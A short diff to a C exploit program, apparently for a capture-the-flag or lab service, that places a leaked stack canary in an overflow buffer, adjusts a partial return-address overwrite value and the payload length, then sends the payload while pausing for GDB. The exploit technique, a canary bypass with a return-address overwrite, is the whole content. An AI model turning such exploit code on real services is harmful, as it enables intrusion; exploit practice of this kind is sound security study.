@@ -72,7 +72,7 @@ int main() {
     memset((void*)expl, 0x00, explsz);
 
     expl[explsz/sizeof(void*)-3] = (void*)stack_canary;
-    expl[explsz/sizeof(void*)-1] = 0x00000000000016c0;
+    expl[explsz/sizeof(void*)-1] = (void*)0x00000000000000c0;
 
     fprintf(stderr, "Attach GDB now if you need to!");
 	getchar();
@@ -82,7 +82,7 @@ int main() {
     get_formatted("%*s");
 
     put_str("u ");
-    put_bin((char*)expl, explsz - 6);
+    put_bin((char*)expl, explsz - 7);
     put_str("\n");
     send();
     get_formatted("%*s");
